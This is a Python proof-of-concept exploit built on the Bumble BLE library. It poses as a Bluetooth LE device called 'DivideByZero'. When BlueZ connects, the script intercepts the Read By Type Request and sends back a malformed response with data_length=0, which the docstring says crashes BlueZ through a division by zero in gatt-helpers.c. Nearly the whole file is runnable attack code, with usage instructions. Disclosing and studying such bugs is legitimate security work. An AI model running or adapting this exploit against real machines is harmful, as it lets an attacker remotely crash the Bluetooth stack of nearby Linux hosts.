"""
PoC: Division by Zero in BlueZ GATT Read By Type Response

CWE:  CWE-369 (Divide By Zero)
File: src/shared/gatt-helpers.c:1297

Trigger: BlueZ connects to this BLE device -> sends Read By Type Request
         -> this server responds with data_length=0
         -> BlueZ: (length - 1) % 0  -> SIGFPE -> crash

Usage:
    sudo .venv/bin/python gatt_divide_by_zero_poc.py hci-socket:<hci_dev>
    Example: sudo .venv/bin/python gatt_divide_by_zero_poc.py hci-socket:1
"""

import asyncio
import logging
import struct
import sys

from bumble.device import Device, Connection
from bumble.transport import open_transport
from bumble.core import AdvertisingData, UUID, BT_BR_EDR_NOT_SUPPORTED
from bumble.hci import Address, Host, OwnAddressType
from bumble import gatt as gatt_module
from bumble.gatt import Service

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger(__name__)

BT_ATT_OP_READ_BY_TYPE_REQ = 0x08
BT_ATT_OP_READ_BY_TYPE_RSP = 0x09


class DivideByZeroDevice(Device):
    """A BLE device that responds to Read By Type with data_length=0."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._original_on_gatt_pdu = None

    async def start(self):
        """Start advertising."""
        # Set up GATT server with a dummy service
        await self.add_service(Service(UUID('00001801-0000-1000-8000-00805F9B34FB')))

        # Register connection handler
        self.on('connection', self.on_connection)

        # Start advertising
        advertising_data = bytes(AdvertisingData([
            (AdvertisingData.FLAGS, bytes([BT_BR_EDR_NOT_SUPPORTED | 0x02])),
            (AdvertisingData.COMPLETE_LOCAL_NAME, b'DivideByZero'),
            (AdvertisingData.INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS,
             b'\x01\x18'),
        ]))

        await self.start_advertising(
            advertising_type=0,  # UNDIRECTED_CONNECTABLE_SCANNABLE
            advertising_data=advertising_data,
        )

        logger.info('[+] Advertising as "DivideByZero"')
        logger.info('[+] Waiting for BlueZ to connect...')

    def on_connection(self, connection):
        """Called when BlueZ connects."""
        logger.info(f'[+] BlueZ connected: {connection}')

        # Hijack the GATT server's on_gatt_pdu to intercept
        # Read By Type Request
        if connection.gatt_server:
            self._original_on_gatt_pdu = connection.gatt_server.on_gatt_pdu
            connection.gatt_server.on_gatt_pdu = self._hijacked_on_gatt_pdu
            logger.info('[+] GATT server hijacked - will intercept Read By Type')
        else:
            logger.error('[-] No gatt_server on connection!')

    def _hijacked_on_gatt_pdu(self, connection, att_pdu):
        """Intercepted ATT PDU handler."""
        if att_pdu.op_code == BT_ATT_OP_READ_BY_TYPE_REQ:
            logger.info('[>>>] Received Read By Type Request!')

            # Parse request details
            start_handle = struct.unpack_from('<H', att_pdu.data, 0)[0]
            end_handle = struct.unpack_from('<H', att_pdu.data, 2)[0]
            uuid_bytes = att_pdu.data[4:]

            logger.info(f'      Start Handle: 0x{start_handle:04X}')
            logger.info(f'      End Handle:   0x{end_handle:04X}')
            logger.info(f'      UUID:         {uuid_bytes.hex()}')

            # 🚨 CRAFT MALICIOUS RESPONSE 🚨
            # Normal response: Opcode | data_length | Handle_Value_Pairs
            # Malicious: set data_length = 0
            # BlueZ will execute: (length - 1) % 0  → SIGFPE
            malformed_rsp = struct.pack('<BB', BT_ATT_OP_READ_BY_TYPE_RSP, 0)

            logger.info(f'[<<<] Sending response with data_length=0: {malformed_rsp.hex()}')
            logger.info(f'      -> BlueZ will crash: (length-1) % 0 = division by zero')

            # Send directly via L2CAP
            connection.send_l2cap_pdu(0x0004, malformed_rsp)

            # Don't call the original handler
            return

        # Pass through all other PDUs
        if self._original_on_gatt_pdu:
            self._original_on_gatt_pdu(connection, att_pdu)


async def main():
    if len(sys.argv) < 2:
        logger.error('Usage: sudo .venv/bin/python gatt_divide_by_zero_poc.py <transport>')
        logger.error('  Example: sudo .venv/bin/python gatt_divide_by_zero_poc.py hci-socket:1')
        sys.exit(1)

    transport = sys.argv[1]
    logger.info(f'[+] Opening transport: {transport}')

    async with await open_transport(transport) as (hci_source, hci_sink):
        logger.info('[+] Transport opened')

        device = DivideByZeroDevice(
            name='DivideByZero',
            address=Address('BB:BB:BB:BB:BB:BB', address_type=Address.PUBLIC_DEVICE_ADDRESS),
            host=Host(hci_source=hci_source, hci_sink=hci_sink),
        )

        await device.start()
        await asyncio.Event().wait()  # Run forever


if __name__ == '__main__':
    asyncio.run(main())
